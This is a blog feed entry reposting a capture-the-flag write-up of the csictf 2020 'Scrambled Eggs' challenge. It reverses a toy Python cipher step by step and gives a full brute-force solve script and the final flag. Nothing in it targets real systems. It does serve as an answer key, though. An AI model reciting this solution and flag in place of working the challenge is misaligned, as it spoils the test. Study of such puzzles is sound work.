        <updated>2020-09-09T15:40:51.000Z</updated>
        <content type="html"><![CDATA[<h1 id="scrambled-eggs-csictf-2020-转载自httpsctftimeorg">Scrambled Eggs (csictf 2020) 转载自https://ctftime.org/</h1>
<h2 id="转载-用于个人学习">转载！！！ 用于个人学习</h2>
<h2 id="challenge-description">Challenge description</h2>
<blockquote>
<p>I like my eggs sunny side up, but I ended up scrambling them.</p>
</blockquote>
<p>In this <strong>reversing</strong>/<strong>crypto</strong> challenge, we are provided with two files : [scrambledeggs.txt](https://github.com/malikDaCoda/CTFs-writeups/tree/master/reverse/csictf 2020-Scrambled Eggs/scrambledeggs.txt) which contains two encrypted keys and the encrypted flag, and [scrambledeggs.py](https://github.com/malikDaCoda/CTFs-writeups/tree/master/reverse/csictf 2020-Scrambled Eggs/scrambledeggs.py) the python script that was used to encrypt the flag.</p>
<p><strong>scrambledeggs.txt</strong> :</p>
<pre><code>Encrytped key1 = xtfsyhhlizoiyx                                                                                                                  
Encrypted key2 = eudlqgluduggdluqmocgyukhbqkx                                                                                                    
Encrypted flag = lvvrafwgtocdrdzfdqotiwvrcqnd
</code></pre>
<p><strong>scrambledeggs.py</strong> :</p>
<pre><code class="language-python">import random 
import sys

map = ['v', 'r', 't', 'p', 'w', 'g', 'n', 'c', 'o', 'b', 'a', 'f', 'm', 'i', 'l', 'u', 'h', 'z', 'd', 'q', 'j', 'y', 'x', 'e', 'k', 's']

flag = 'csictf{this_is_a_fake_flag}'
flag = flag.replace('{','a')
flag = flag.replace('}','a')
flag = flag.replace('_','b')
key1 = 'ashikka_is_mine'
key1 = key1.replace('_','b')

if(len(flag) != 28 or len(key1) != 14):
    exit()
    
flag = list(flag)
key1 = list(key1)


def enc1(text):
    n = random.randint(0,sys.maxsize%28)
    return text[n:] + text[:n]
    
flag = enc1(flag)
    
def enc2(text):
    temp = ''
    for i in text:
        temp += map[ord(i)-ord('a')]
    return temp

key2 = enc2(enc2(key1))
key2 = list(key2)

for j in range(2):
    for i in range(14):
        temp1 = flag[i]
        flag[i] = flag[(ord(key1[i])-ord('a'))%28] 
        flag[(ord(key1[i])-ord('a'))%28] = temp1
        temp2 = key1[i]
        key1[i] = key1[(ord(key2[i])-ord('a'))%14] 
        key1[(ord(key2[i])-ord('a'))%14] = temp2
        
        
    for i in range(14,28):
        temp1 = flag[i]
        flag[i] = flag[(ord(key2[i-14])-ord('a'))%28] 
        flag[(ord(key2[i-14])-ord('a'))%28] = temp1
        temp2 = key2[i-14]
        key2[i-14] = key2[(ord(key1[i-14])-ord('a'))%14] 
        key2[(ord(key1[i-14])-ord('a'))%14] = temp2
        

l = random.sample([key1, key2], 2)
key1 = l[0]
key2 = l[1]

k = ''
for i in range(14):
    k += random.choice(map)
k = list(k)

key2 = k+key2
for i in range(14):
    a = ord(k[i])-ord('a')+ord(key2[i+14])
    if a&gt;122:
        a=a%122
        a=a+97
    key2[i+14]= chr(a)

flag = ''.join(flag)
key1 = ''.join(key1)
key2 = ''.join(key2)
 
key2 = enc2(key2)
flag= enc1(enc1(enc1(enc2(flag))))

print('Encrytped key1 = '+key1)
print('Encrypted key2 = '+key2)
print('Encrypted flag = '+flag)
</code></pre>
<h2 id="approach-to-the-solution">Approach to the solution</h2>
<h3 id="understanding-the-script">Understanding the script</h3>
<p>After calmly reading and trying to understand the script above, we can summarize its steps as the following points :</p>
<ul>
<li>we start off with the assignment of <code>flag</code> and <code>key1</code> (which both are not the actual ones obviously)</li>
</ul>
<pre><code class="language-python">flag = 'csictf{this_is_a_fake_flag}'
flag = flag.replace('{','a')
flag = flag.replace('}','a')
flag = flag.replace('_','b')
key1 = 'ashikka_is_mine'
key1 = key1.replace('_','b')
</code></pre>
<ul>
<li><code>flag</code> is encrypted using the <code>enc1</code> function</li>
</ul>
<pre><code class="language-python">flag = enc1(flag)
</code></pre>
<ul>
<li><code>key2</code> is assigned as the double encryption of <code>key1</code> using the <code>enc2</code> function</li>
</ul>
<pre><code class="language-python">key2 = enc2(enc2(key1))
</code></pre>
<ul>
<li>then comes the big double loop, which simply makes a few swaps between the characters of <code>flag</code>, <code>key1</code> and <code>key2</code></li>
</ul>
<pre><code class="language-python">for j in range(2):
    for i in range(14):
        temp1 = flag[i]
        flag[i] = flag[(ord(key1[i])-ord('a'))%28] 
        flag[(ord(key1[i])-ord('a'))%28] = temp1
        temp2 = key1[i]
        key1[i] = key1[(ord(key2[i])-ord('a'))%14] 
        key1[(ord(key2[i])-ord('a'))%14] = temp2
        
        
    for i in range(14,28):
        temp1 = flag[i]
        flag[i] = flag[(ord(key2[i-14])-ord('a'))%28] 
        flag[(ord(key2[i-14])-ord('a'))%28] = temp1
        temp2 = key2[i-14]
        key2[i-14] = key2[(ord(key1[i-14])-ord('a'))%14] 
        key2[(ord(key1[i-14])-ord('a'))%14] = temp2
</code></pre>
<ul>
<li>after that, there is a possibility that <code>key1</code> and <code>key2</code> are swapped</li>
</ul>
<pre><code class="language-python">l = random.sample([key1, key2], 2)
key1 = l[0]
key2 = l[1]
</code></pre>
<ul>
<li>random characters are appended to <code>key2</code>, and using those characters <code>key2</code>'s characters are modified</li>
</ul>
<pre><code class="language-python">k = ''
for i in range(14):
    k += random.choice(map)
k = list(k)

key2 = k+key2
for i in range(14):
    a = ord(k[i])-ord('a')+ord(key2[i+14])
    if a&gt;122:
        a=a%122
        a=a+97
    key2[i+14]= chr(a)
</code></pre>
<ul>
<li><code>key2</code> is encrypted using the <code>enc2</code> function</li>
</ul>
<pre><code class="language-python">key2 = enc2(key2)
</code></pre>
<ul>
<li><code>flag</code> is encrypted using the <code>enc2</code> function, and then encrypted three times using the <code>enc1</code> function</li>
</ul>
<pre><code class="language-python">flag= enc1(enc1(enc1(enc2(flag))))
</code></pre>
<ul>
<li>finally <code>key1</code>, <code>key2</code> and <code>flag</code> are printed</li>
</ul>
<pre><code class="language-python">print('Encrytped key1 = '+key1)
print('Encrypted key2 = '+key2)
print('Encrypted flag = '+flag)
</code></pre>
<h3 id="how-to-approach-this">How to approach this ?</h3>
<p>The general approach to take for this type of challenges is to first start by identifying and dividing the big individual problems/steps and come up with solutions for them if possible, then we procede to reverse each step starting from the bottom heading to the top, and we have to make sure to mark the steps where different values could come up, in our case, these are the steps where random values are used. Since we cannot guess those values, we use brute force by computing all the possible combinations.</p>
<p>So first, let's start by identifying the steps where brute force is needed and where not :</p>
<ul>
<li>the <code>enc1</code> function uses random values to determine where to split the <code>text</code> argument, that means brute force is required</li>
</ul>
<pre><code class="language-python">def enc1(text):
    n = random.randint(0,sys.maxsize%28)
    return text[n:] + text[:n]
</code></pre>
<ul>
<li>the <code>enc2</code> function simply maps characters from <code>text</code> to the <code>map</code> defined at the top of the script, so we can &quot;undo&quot; that</li>
</ul>
<pre><code class="language-python">map = ['v', 'r', 't', 'p', 'w', 'g', 'n', 'c', 'o', 'b', 'a', 'f', 'm', 'i', 'l', 'u', 'h', 'z', 'd', 'q', 'j', 'y', 'x', 'e', 'k', 's']
def enc2(text):
    temp = ''
    for i in text:
        temp += map[ord(i)-ord('a')]
    return temp
</code></pre>
<ul>
<li>the big double loop looks daunting but it is easily reversible by litteraly reversing the steps</li>
<li>the key swapping is out of our control, we have to consider the two cases where <code>key1</code> and <code>key2</code> are swapped and when they are not</li>
<li>the part where random characters are mixed with <code>key2</code> aspires that we need to use brute force, but we will find out later that we can actually recover <code>key2</code> without using brute force</li>
</ul>
<h2 id="crafting-the-solution">Crafting the solution</h2>
<p>Now that we have identified the major steps of the encryption and the steps that require brute force, we can begin writing the solution. We will start off by writing some functions that will help us reverse some steps.</p>
<h3 id="reversing-enc1">reversing <code>enc1</code></h3>
<p>The <code>enc1</code> function generates first a random number <code>n</code> using <code>random.randint(0, sys.maxsize%28)</code>, <code>sys.maxsize</code> refers to the platform's pointer size, for 64-bit machines that's <code>2**63-1</code>, therefore, if we assume that the machine used to run the script is 64-bit <code>sys.maxsize%28</code> evaluates to <code>7</code>.</p>
<p>Since we can't guess the random numbers generated, we will simply define the reverse function <code>dec1</code> to take two arguments <code>text</code> and <code>n</code> :</p>
<pre><code class="language-python">def dec1(text, n):
    assert(0 &lt;= n &lt; 28)
    return text[-n:] + text[:-n]
</code></pre>
<p>Then in our main function, we will make sure to generate all the possible values for <code>n</code> (0 to 7)</p>
<h3 id="reversing-enc2">reversing <code>enc2</code></h3>
<p>On the other hand <code>enc2</code> is easily reversible by remapping the characters of <code>text</code> like this :</p>
<pre><code class="language-python">def dec2(text):
    # map each character of text to the character of order :
    # index of text[i] in scramble_map + ord('a')
    return ''.join(chr(scramble_map.index(char) + ord('a')) for char in text)
</code></pre>
<h3 id="unlooping">unlooping</h3>
<p>As stated before, we reverse the big double loop by simply reversing the steps, just like this :</p>
<pre><code class="language-python">def unloop(key1, key2, flag):
    key1, key2, flag = list(key1), list(key2), list(flag)
    assert (len(key1) == len(key2) == 14)
    for j in range(2):
        # we make sure the range is from 27 to 14, not 14 to 27
        for i in range(27, 13, -1):
            # taking advantage of python's built-in way to swap values
            # rather than using a temp variable
            index = (ord(key1[i-14]) - ord('a')) % 14
            key2[index], key2[i-14] = key2[i-14], key2[index]

            index = (ord(key2[i-14]) - ord('a')) % 28
            flag[i], flag[index] = flag[index], flag[i]

        for i in range(13, -1, -1):
            index = (ord(key2[i]) - ord('a')) % 14
            key1[index], key1[i] = key1[i], key1[index]

            index = (ord(key1[i]) - ord('a')) % 28
            flag[i], flag[index] = flag[index], flag[i]

    return ''.join(key1), ''.join(key2), ''.join(flag)
</code></pre>
<h3 id="recovering-key2">recovering <code>key2</code></h3>
<p>We said before that the part where 14 random characters were mixed up with <code>key2</code> is reversible without brute force, that's because those random chars are appended to <code>key2</code> and not scrambled afterwards, so here are the steps to recover <code>key2</code> :</p>
<pre><code class="language-python">def recover_key2(ekey2):
    assert(len(ekey2) == 28)
    # the random characters are the 14 first
    k = ekey2[:14]
    # the list of `a`s
    alist = list(map(ord, ekey2[14:]))
    res = ''
    for i in range(14):
        # we simply compute c using linear equations
        c = alist[i] - ord(k[i]) + ord('a')
        # since all characters are ascii lowercase
        # this check helps avoiding multiple potential values
        if not ord('a') &lt;= c &lt;= ord('z'):
            c += 122 - 97
        res += chr(c)
    return res
</code></pre>
<h3 id="wrapping-everything-up">Wrapping everything up</h3>
<p>In order to join everything we have been working on, we simply reverse the steps of the total encryption from bottom to top :</p>
<ol>
<li>Generate combinations of three <code>n</code>s (from 0 to 7)</li>
</ol>
<pre><code class="language-python">randsize = 7
combinations = [p for p in itertools.product(range(randsize+1), repeat=3)]
</code></pre>
<ol>
<li>Use the combinations to call <code>dec1</code> three times on the encrypted flag, and then call <code>dec2</code> (we can call <code>dec2</code> first since <code>dec1</code> doesn't change the characters of <code>text</code>)</li>
</ol>
<pre><code class="language-python">flag = dec2(eflag)
for c in combinations:
    flag = dec1(dec1(dec1(flag, c[0]), c[1]), c[2])
</code></pre>
<ol>
<li>Call <code>dec2</code> on the encrypted <code>key2</code></li>
</ol>
<pre><code class="language-python">key2 = dec2(ekey2)
</code></pre>
<ol>
<li>Recover <code>key2</code> using <code>recover_key2</code></li>
</ol>
<pre><code class="language-python">key2 = recover_key2(key2)
</code></pre>
<ol>
<li>Choose whether to swap <code>key1</code> and <code>key2</code> or not</li>
</ol>
<pre><code class="language-python">swapkeys = True
if swapkeys: key1, key2 = key2, key1
</code></pre>
<ol>
<li>Undo the big double loop using <code>unloop</code></li>
</ol>
<pre><code class="language-python">key1, key2, flag = unloop(key1, key2, flag)
</code></pre>
<ol>
<li>Since originally, before the loop, <code>key2</code> is equal to <code>enc2(enc2(key1))</code> we can check whether that is true to minimize the results</li>
</ol>
<pre><code class="language-python">if dec2(dec2(key2)) == key1:
</code></pre>
<ol>
<li>Once again we generate <code>n</code>s to decrypt <code>flag</code> with <code>dec1</code></li>
</ol>
<pre><code class="language-python">for n in range(randsize + 1):
    flag = dec1(flag, n)
    results.append(flag)
</code></pre>
<ol>
<li>Finally, we can store all the resulting flags in a file named &quot;results.txt&quot;, so that we can check out if it contains the actual correct flag</li>
</ol>
<pre><code class="language-python">outfile = 'results.txt'
with open(outfile, 'w') as f:
    f.write('\n'.join(results))
    f.close()
</code></pre>
<p><strong>Note</strong> : steps 3, 4 and 5 can be done before generating the combinations since those combinations affect only <code>flag</code></p>
<h3 id="the-main-function">The main function</h3>
<pre><code class="language-python">combinations = [p for p in itertools.product(range(randsize+1), repeat=3)]
key1 = ekey1
key2 = recover_key2(dec2(ekey2))
flag = dec2(eflag)
if swapkeys: key1, key2 = key2, key1
original = flag, key1, key2
results = []
for c in combinations:
    flag = dec1(dec1(dec1(flag, c[0]), c[1]), c[2])
    key1, key2, flag = unloop(key1, key2, flag)
    if dec2(dec2(key2)) == key1:
        for n in range(randsize + 1):
            flag = dec1(flag, n)
            results.append(flag)
    flag, key1, key2 = original
with open(outfile, 'w') as f:
    f.write('\n'.join(results))
    f.close()
</code></pre>
<p>The full script is [here](https://github.com/malikDaCoda/CTFs-writeups/tree/master/reverse/csictf 2020-Scrambled Eggs/solve.py)</p>
<h2 id="unscrambled-eggs">Unscrambled Eggs</h2>
<p>On the first try, when <code>swapkeys</code> is set to <code>False</code>, &quot;results.txt&quot; turns out to be empty. But then after setting that to <code>True</code>, the file is quite populated, that could mean that we've been successful.</p>
<p><code>grep &quot;^csictf&quot; results.txt</code> :</p>
<figure data-type="image" tabindex="1"><img src="https://github.com/malikDaCoda/CTFs-writeups/tree/master/reverse/csictf%202020-Scrambled%20Eggs/img/grep1.png" alt="grep &quot;^csictf&quot; results.txt" loading="lazy"></figure>
<p>Hmmm.. we get nothing</p>
<p><code>grep &quot;csictf&quot; results.txt</code> :</p>
<figure data-type="image" tabindex="2"><img src="https://github.com/malikDaCoda/CTFs-writeups/tree/master/reverse/csictf%202020-Scrambled%20Eggs/img/grep2.png" alt="grep &quot;csictf&quot; results.txt" loading="lazy"></figure>
<p>Ah ! we get some results now, if we replace some <code>a</code>s and <code>b</code>s to <code>{</code>, <code>}</code> and <code>_</code> in <code>sacsictfaallbthebkingsbhorse</code> we can read <code>s}csictf{all_the_kings_horse</code>.</p>
<p>It is trivial now that the <strong>flag</strong> is :</p>
<pre><code>csictf{all_the_kings_horses}
</code></pre>
<h2 id="the-full-script">The full script</h2>
<pre><code>#!/usr/bin/env python3
import itertools

# encrypted key1, key2 and flag (from scrambledeggs.txt)
ekey1 = 'xtfsyhhlizoiyx'
ekey2 = 'eudlqgluduggdluqmocgyukhbqkx'
eflag = 'lvvrafwgtocdrdzfdqotiwvrcqnd'

scramble_map = ['v', 'r', 't', 'p', 'w', 'g', 'n', 'c', 'o', 'b', 'a', 'f', 'm', 'i', 'l', 'u', 'h', 'z', 'd', 'q', 'j', 'y', 'x', 'e', 'k', 's']
# result of the evaluation of (sys.maxsize % 28) for 64-bit machines
randsize = 7
# to choose whether or not to swap key1 and key2
swapkeys = True
# write the resulting flag combinations to a file
outfile = 'results.txt'

# reverse enc1, but provide n
def dec1(text, n):
    assert(0 &lt;= n &lt; 28)
    return text[-n:] + text[:-n]

# reverse enc2
def dec2(text):
    # map each character of text to the character of order :
    # index of text[i] in scramble_map + ord('a')
    return ''.join(chr(scramble_map.index(char) + ord('a')) for char in text)

# recover key2 from the encrypted key2 (the part where random chars are appended to key2)
def recover_key2(ekey2):
    assert(len(ekey2) == 28)
    # the random characters are the 14 first
    k = ekey2[:14]
    # the list of `a`s
    alist = list(map(ord, ekey2[14:]))
    res = ''
    for i in range(14):
        # we simply compute c using linear equations
        c = alist[i] - ord(k[i]) + ord('a')
        # since all characters are ascii lowercase
        # this check helps avoiding multiple potential values
        if not ord('a') &lt;= c &lt;= ord('z'):
            c += 122 - 97
        res += chr(c)
    return res

# undo the big double loop
def unloop(key1, key2, flag):
    key1, key2, flag = list(key1), list(key2), list(flag)
    assert (len(key1) == len(key2) == 14)
    for j in range(2):
        # we make sure the range is from 27 to 14, not 14 to 27
        for i in range(27, 13, -1):
            # taking advantage of python's built-in way to swap values
            # rather than using a temp variable
            index = (ord(key1[i-14]) - ord('a')) % 14
            key2[index], key2[i-14] = key2[i-14], key2[index]

            index = (ord(key2[i-14]) - ord('a')) % 28
            flag[i], flag[index] = flag[index], flag[i]

        for i in range(13, -1, -1):
            index = (ord(key2[i]) - ord('a')) % 14
            key1[index], key1[i] = key1[i], key1[index]

            index = (ord(key1[i]) - ord('a')) % 28
            flag[i], flag[index] = flag[index], flag[i]

    return ''.join(key1), ''.join(key2), ''.join(flag)

if __name__ == '__main__':
    # generate the combinations of 3 `n`s using itertools.product
    combinations = [p for p in itertools.product(range(randsize+1), repeat=3)]
    key1 = ekey1
    key2 = recover_key2(dec2(ekey2))
    flag = dec2(eflag)
    if swapkeys: key1, key2 = key2, key1
    original = flag, key1, key2
    results = []
    for c in combinations:
        flag = dec1(dec1(dec1(flag, c[0]), c[1]), c[2])
        key1, key2, flag = unloop(key1, key2, flag)
        if dec2(dec2(key2)) == key1:
            for n in range(randsize + 1):
                flag = dec1(flag, n)
                results.append(flag)
        flag, key1, key2 = original
    with open(outfile, 'w') as f:
        f.write('\n'.join(results))
        f.close()
</code></pre>
]]></content>
    </entry>
</feed>